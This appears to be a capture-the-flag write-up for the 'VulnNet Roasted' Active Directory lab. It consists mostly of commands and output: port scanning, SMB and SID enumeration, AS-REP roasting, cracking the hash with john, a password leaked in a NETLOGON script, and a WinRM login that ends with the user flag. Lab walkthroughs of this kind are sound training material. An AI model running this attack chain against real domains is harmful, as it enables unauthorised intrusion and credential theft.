```Bash
nmap -p- -Pn $target -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -A
```
```Bash
Discovered open port 135/tcp on 10.201.127.94
Discovered open port 139/tcp on 10.201.127.94
Discovered open port 445/tcp on 10.201.127.94
Discovered open port 53/tcp on 10.201.127.94
Discovered open port 53/tcp on 10.201.127.94
SYN Stealth Scan Timing: About 22.92% done; ETC: 07:03 (0:01:44 remaining)
Discovered open port 49670/tcp on 10.201.127.94
Discovered open port 49668/tcp on 10.201.127.94
SYN Stealth Scan Timing: About 45.82% done; ETC: 07:03 (0:01:12 remaining)
Discovered open port 49666/tcp on 10.201.127.94
Discovered open port 5985/tcp on 10.201.127.94
SYN Stealth Scan Timing: About 68.72% done; ETC: 07:03 (0:00:41 remaining)
Discovered open port 636/tcp on 10.201.127.94
Discovered open port 3269/tcp on 10.201.127.94
Discovered open port 464/tcp on 10.201.127.94
Discovered open port 49669/tcp on 10.201.127.94
Discovered open port 389/tcp on 10.201.127.94
Discovered open port 49703/tcp on 10.201.127.94
Discovered open port 49677/tcp on 10.201.127.94
Discovered open port 593/tcp on 10.201.127.94
Discovered open port 88/tcp on 10.201.127.94
Discovered open port 3268/tcp on 10.201.127.94
Discovered open port 9389/tcp on 10.201.127.94
Completed SYN Stealth Scan at 07:03, 131.98s elapsed (65535 total ports)
Initiating Service scan at 07:03
Scanning 19 services on 10.201.127.94
Completed Service scan at 07:04, 60.07s elapsed (19 services on 1 host)
Initiating OS detection (try #1) against 10.201.127.94
Retrying OS detection (try #2) against 10.201.127.94
Initiating Traceroute at 07:04
Completed Traceroute at 07:04, 3.35s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 07:04
Completed Parallel DNS resolution of 2 hosts. at 07:04, 0.03s elapsed
NSE: Script scanning 10.201.127.94.
Initiating NSE at 07:04
Completed NSE at 07:05, 40.10s elapsed
Initiating NSE at 07:05
Completed NSE at 07:05, 9.11s elapsed
Initiating NSE at 07:05
Completed NSE at 07:05, 0.00s elapsed
Nmap scan report for 10.201.127.94
Host is up (0.31s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-14 11:03:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
```
```Bash
 =================================( Share Enumeration on 10.201.127.94 )=================================
                                                                                                                                                                                                                                            
do_connect: Connection to 10.201.127.94 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.201.127.94                                                                                                                                                                                               
                                                                                                                                                                                                                                            
//10.201.127.94/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                           
//10.201.127.94/C$      Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                                                                                                           
//10.201.127.94/IPC$    Mapping: N/A Listing: N/A Writing: N/A
//10.201.127.94/NETLOGON        Mapping: OK Listing: DENIED Writing: N/A
//10.201.127.94/SYSVOL  Mapping: OK Listing: DENIED Writing: N/A
//10.201.127.94/VulnNet-Business-Anonymous      Mapping: OK Listing: OK Writing: N/A
//10.201.127.94/VulnNet-Enterprise-Anonymous    Mapping: OK Listing: OK Writing: N/A

 ===========================( Password Policy Information for 10.201.127.94 )===========================
```
We didn’t find anything on shares
But, we can see SID from enum4linux
```Bash
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-1589833671-435344116-4136949213                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-1589833671-435344116-4136949213                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-1589833671-435344116-4136949213
```
Ok. Use this one:
```Bash
impacket-lookupsid vulnnet-rst.local/guest@$target | grep "SidTypeUser"
```
```Bash
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```
```Bash
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile user.txt -format hashcat -outputfile hashes.txt
```
```Bash
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:f9703671c26dd287e604223e88c2b8b9$f35bc579c885b2098165f9397e0128ec7baa9b41e4ceb5fe120cbbe16c5c40ebfc1e1f9950a61e629a48f61c8e236dff705e78157db4e54cce27b3622d5deb1303f4042b94fa393ea7b0d64b178fdfdc8f9e3e3fa0a48262d22b2c85140a94f13f61d721b1a8a9b59e0f304dbb72c83b8e8a5a547a6827a3d12e71a5ec76ed5b714cae8cb9b6493d8f36f03da3c4621537e0bc5bf411792de3b6fc18ba988e9cf24534229ec8b9c195abe6d146b7f55cf9c8576c298ed2de91b5b3b05710ab3aec68fc3191c0f741be3dd64fb2d757f8ef68cd911b5d921247d340ad39c75efc518cbe9eb2c1c863f277298e1d1b2d9b7ef6de379a25
```
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=krb5asrep
```
```Bash
t-skid:tj072889*
```
```Bash
smbclient \\\\$target\\NETLOGON -U vulnnet-rst.local\\t-skid
```
```Bash
smb: \> dir
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4536218 blocks available
smb: \> mget ResetPassword.vbs
Get file ResetPassword.vbs? y
```
```Bash
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```
Boom:
```Bash
┌──(kali㉿kali)-[~/Desktop/vulnet_roasted-thm]
└─$ crackmapexec winrm $target -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
SMB         10.201.27.231   5985   WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
HTTP        10.201.27.231   5985   WIN-2BO8M1OE1M1  [*] http://10.201.27.231:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.201.27.231   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```
```Bash
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content
THM{726b7c0baaac1455d05c827b5561f4ed}
```